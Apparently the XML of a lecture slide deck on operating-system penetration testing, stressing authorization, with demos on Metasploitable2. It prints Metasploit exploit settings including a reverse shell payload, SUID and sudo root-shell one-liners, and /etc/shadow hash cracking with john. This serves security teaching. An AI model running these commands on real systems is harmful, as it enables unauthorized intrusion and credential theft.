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82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84" y="1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52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on RoE - it's the single most important concept before any hands-on tool use. Emphasize the isolated VirtualBox lab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822960" cy="822960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8458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OS-LEVEL PENETRATION TESTING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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Fundamentals, Methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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SESSION ROADMAP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Today's Agenda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01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Intro, Ethics &amp; Legal Framing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20370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20370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02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17320" y="22037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OS Pentesting Methodology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7157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03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17320" y="271576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Reconnaissance &amp; Enumeration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227832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322783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04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7320" y="32278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Vulnerability Identification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72946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372946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05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17320" y="37294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Exploitation Fundamentals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4241528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7240" y="424152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06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417320" y="424152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Privilege Escalation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4753592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77240" y="475359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07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475359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Post-Exploitation &amp; Persistence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5265656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77240" y="526565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08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417320" y="526565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Reporting &amp; Wrap-up / Q&amp;A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02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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SEGMENT 1 · INTRODUCTION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Penetration Testing?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035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Authorized, simulated attack against a system to evaluate its security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Goes beyond scanning — actively attempts exploitation to prove real impact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Bounded by a Rules of Engagement (RoE): scope, authorization, time window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Distinct from ongoing red teaming, which simulates a persistent adversary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4663440" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780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223760" y="19110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Vulnerability Scan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223760" y="22585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Automated, breadth-first — finds potential issues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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949440" y="3044952"/>
            <a:ext cx="4663440" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780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172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Penetration Test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223760" y="3520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E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Manual + tool-assisted — proves exploitability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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949440" y="4306824"/>
            <a:ext cx="4663440" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6780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2376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Red Team Exercise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223760" y="4782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Stealthy, goal-driven, ongoing simulation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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SEGMENT 1 · BEFORE WE TOUCH A KEYBOARD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Ethics &amp; Legal Framing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92640" y="548640"/>
            <a:ext cx="1371600" cy="13716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0" y="89154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Authorization is everything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253288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Unauthorized access is a crime — regardless of intent — under laws like the CFAA / Computer Misuse Act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983480" y="19659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2578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Rules of Engagement (RoE)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257800" y="253288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Defines scope, timing, allowed techniques, and emergency contacts before testing begins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CIA Triad impact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2960" y="449884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Every technique today maps to Confidentiality, Integrity, or Availability risk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983480" y="393192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2578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Today’s lecture only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257800" y="449884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Every tool shown is legal only inside isolated VirtualBox environment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04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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Engagement &amp;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Pentesting: authorized, goal-driven attack simulation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scanning: automated discovery only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teaming: broader, stealthier, longer engagement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4015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 (RoE)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767328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scope - which systems are in bounds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authorization - written permission required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time window - start/end of testing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0936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 Mapping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- data exposure risk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- unauthorized modification risk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- service disruption risk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34015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Reality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3767328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is a crime regardless of intent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your local Computer Misuse / Fraud Act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tools are legal only inside our isolated lab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SEGMENT 2 · THE FRAMEWORK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OS Pentesting Methodology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0" y="3319272"/>
            <a:ext cx="658368" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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188720" cy="118872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0403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6003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28600" y="4069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Recon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75888" y="3319272"/>
            <a:ext cx="658368" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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487168" y="2743200"/>
            <a:ext cx="1188720" cy="118872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348" y="304038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3091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075688" y="4069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Scan / Enumerate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522976" y="3319272"/>
            <a:ext cx="658368" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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334256" y="2743200"/>
            <a:ext cx="1188720" cy="118872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436" y="304038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30179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922776" y="4069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Vuln Analysis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370064" y="3319272"/>
            <a:ext cx="658368" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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181344" y="2743200"/>
            <a:ext cx="1188720" cy="1188720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524" y="304038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77267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769864" y="4069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Exploitation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9217152" y="3319272"/>
            <a:ext cx="658368" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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8028432" y="2743200"/>
            <a:ext cx="1188720" cy="118872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5612" y="3040380"/>
            <a:ext cx="594360" cy="5943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324355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7616952" y="4069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Post-Exploit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9875520" y="2743200"/>
            <a:ext cx="1188720" cy="118872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2700" y="3040380"/>
            <a:ext cx="594360" cy="5943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171443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9464040" y="4069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Reporting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868680" y="48920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 takeaway:  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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Steps 1–3 (recon through vulnerability analysis) are often 70% of real-world effort — exploitation is the fast part, not the hard part.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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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 · 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 &amp; Enumeration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80320" y="193136"/>
            <a:ext cx="1463040" cy="146304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558896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74519"/>
            <a:ext cx="5349240" cy="4102947"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2778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Recon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 info without touching the target directly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WHOIS, DNS records, public metadata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no trace on target logs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89320" y="1874520"/>
            <a:ext cx="5349240" cy="4102946"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2778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25603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interaction: port scans, service probes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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handshake behavior reveals open ports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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fingerprinting via TTL, window size, TCP options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BC9EDBB-E3DC-463D-760A-A04619BEE31B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="431809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Fingerprinting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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2E6FF3E-FB44-2FE6-DC8A-767F6947E223}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4683856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stack quirks reveal the OS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values, window size, option ordering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Nmap's -O flag automates this</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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81A9380-119C-2F76-F881-75892951E3DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6202680" y="431809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FBC82DAC-E4A4-25B4-1772-13091DFE0CC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6202680" y="4683856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real engagements are recon, not exploits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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banners are the breadcrumb to CVEs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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recon = fewer wasted exploit attempts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DEMO A · KALI → METASPLOITABLE2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Network &amp; OS Discovery with Nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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0866120" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2526"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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4688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Host discovery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-sn 192.168.56.0/24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Service &amp; version detection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192.168.56.101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OS fingerprinting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-O 192.168.56.101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Aggressive scan + save output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-A -T4 -oN recon_output.txt 192.168.56.101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SEGMENT 4 · STEP 3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Vulnerability Identification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05840" cy="1005840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" y="20551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8745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CVE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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catalogs known vulnerabilities;  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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CVSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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scores their severity 0–10.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Automated Scanners</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Nessus, OpenVAS / GVM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Breadth-first, fast coverage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Prone to false positives/negatives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172200" y="292608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Manual / Exploit-DB Lookup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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92240" y="35890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searchsploit, Exploit-DB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Maps banner/version → known exploit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Requires analyst judgment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08</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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LIVE DEMO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DEMO B · KALI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Manual Vulnerability Mapping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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468880"/>
            <a:ext cx="10424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 local exploit database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searchsploit -u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Search using service/version found by nmap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searchsploit vsftpd 2.3.4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searchsploit samba 3.0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 err="1">
                <a:solidFill>
                  <a:srgbClr val="3DDC84"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>searchsploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3DDC84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1350" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3DDC84"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>distcc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54406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Narrative thread:  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="135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banner grabbed in Demo A now becomes a candidate exploit here.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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SEGMENT 5 · STEP 4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Exploitation Fundamentals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94360" cy="59436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20599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exploit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634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code/technique that leverages a specific vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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1520" y="3017520"/>
            <a:ext cx="594360" cy="59436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1661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payload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663440" y="29260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runs after successful exploitation (e.g. a reverse shell)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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31520" y="3977640"/>
            <a:ext cx="594360" cy="59436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41262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886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encoder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663440" y="388620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Reshapes payload bytes to evade simple filters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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731520" y="4937760"/>
            <a:ext cx="594360" cy="59436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508635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846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msfconsole workflow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663440" y="48463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search → use → show options → set → run</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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LIVE DEMO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DEMO C · KALI → METASPLOITABLE2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vsftpd 2.3.4 Backdoor Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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0151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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21122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msf6 &gt;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4688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msfconsole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vsftpd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exploit/unix/ftp/vsftpd_234_backdoor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RHOSTS 192.168.56.101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success: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   →  root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DEMO D · KALI → METASPLOITABLE2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Samba usermap_script Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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0151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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21122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msf6 &gt;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4688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exploit/multi/samba/usermap_script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options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RHOSTS 192.168.56.101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PAYLOAD cmd/unix/reverse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LHOST 192.168.56.1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SEGMENT 6 · STEP 5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Privilege Escalation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Why: most shells land as a low-privilege user. Common Linux privesc vectors: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2560320"/>
            <a:ext cx="731520" cy="73152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43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SUID / SGID Binaries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691640" y="28986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Root-owned executables with the setuid bit set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035040" y="23317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63640" y="2560320"/>
            <a:ext cx="731520" cy="73152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743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Sudo Misconfiguration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178040" y="28986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"sudo -l" reveals NOPASSWD commands to abuse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77240" y="4526280"/>
            <a:ext cx="731520" cy="73152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7091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480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Writable Cron Jobs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691640" y="48646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Scheduled scripts an attacker can overwrite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035040" y="42976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263640" y="4526280"/>
            <a:ext cx="731520" cy="73152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7091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480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Kernel Exploits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178040" y="48646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OS-version-specific — high impact, fragile to demo live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13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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LIVE DEMO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DEMO E · ON THE SHELL FROM DEMO C/D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SUID Binary Abuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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0151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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21122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www-data@target: ~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4688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Enumerate SUID binaries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 -perm -u=s -type f 2&gt;/dev/null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Example: 'find' has the SUID bit set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. -exec /bin/sh -p \; -quit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   →  root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LIVE DEMO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DEMO F · LOW-PRIV USER SESSION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Sudo Misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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0151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167128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3272" y="2167128"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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9304" y="2167128"/>
            <a:ext cx="128016" cy="128016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21122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student@target: ~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4688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-l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(ALL) NOPASSWD: /usr/bin/vim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GTFOBins-style escalation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vim -c ':!/bin/sh'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   →  root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SEGMENT 7 · STEP 5 CONTINUED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Post-Exploitation &amp; Persistence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Goals: sensitive data, credential harvesting, lateral movement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Hash dumping: /etc/shadow contents, cracked offline with john/hashcat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Persistence: cron jobs, SSH authorized_keys injection, systemd services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Stealth trade-off: each mechanism differs in visibility to defenders</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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675120" y="1828800"/>
            <a:ext cx="4937760" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3750"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10151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03720" y="2029968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59752" y="2029968"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C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15784" y="2029968"/>
            <a:ext cx="128016" cy="128016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63840" y="19751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root@target: ~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95160" y="233172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/etc/shadow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--wordlist=rockyou.txt \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shadow_hashes.txt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SEGMENT 8 · STEP 6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Reporting Findings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97696"/>
            <a:ext cx="1005840" cy="1005840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" y="1824010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750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finding is only as useful as its documentation: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Title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51960" y="283464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51960" y="28346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Severity (CVSS)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955280" y="283464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55280" y="28346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Description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" y="406908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40690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Evidence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251960" y="406908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251960" y="40690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Impact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955280" y="406908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955280" y="40690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Remediation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17</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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RECAP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Methodology Chain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91640" y="3319272"/>
            <a:ext cx="1234440" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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1005840" cy="1005840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0861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4023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Recon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(Nmap)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931920" y="3319272"/>
            <a:ext cx="1234440" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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926080" y="2834640"/>
            <a:ext cx="1005840" cy="1005840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540" y="30861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4023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Vuln ID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(searchsploit)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172200" y="3319272"/>
            <a:ext cx="1234440" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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166360" y="2834640"/>
            <a:ext cx="1005840" cy="1005840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30861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9160" y="4023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Exploit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(Metasploit)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8412480" y="3319272"/>
            <a:ext cx="1234440" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9DEE8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406640" y="2834640"/>
            <a:ext cx="1005840" cy="1005840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308610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9440" y="4023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Privesc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(SUID / sudo)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9646920" y="2834640"/>
            <a:ext cx="1005840" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00C38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0" y="308610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89720" y="4023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Report</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Reminder: privilege escalation is almost always about configuration hygiene — not exotic zero-days.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18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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3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REFERENCE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Tool Checklist &amp; Q&amp;A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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9545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64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VirtualBox + Kali Linux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1732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Attacker environment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80760" y="1783080"/>
            <a:ext cx="685800" cy="68580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210" y="1954530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764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Metasploitable2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94944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Intentionally vulnerable target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337185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182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Nmap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417320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Network / service / OS scanning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080760" y="3200400"/>
            <a:ext cx="685800" cy="68580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210" y="337185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3182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searchsploit (Exploit-DB)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949440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Offline exploit lookup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4789170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599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Metasploit Framework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41732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Exploitation framework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6080760" y="4617720"/>
            <a:ext cx="685800" cy="68580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210" y="4789170"/>
            <a:ext cx="342900" cy="3429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4599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John the Ripper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94944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Password hash cracking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00C389"/>
          </a:solidFill>
          <a:ln/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548640" y="5943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3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Questions? Hands-on lab session follows this lecture.</a:t>
            </a:r>
            <a:endParaRPr lang="en-U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19</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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1216</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>283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Tharaniyawarma Kumaralingam</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-20T11:07:15Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-24T00:56:52Z</dcterms:modified>
</cp:coreProperties>
</file>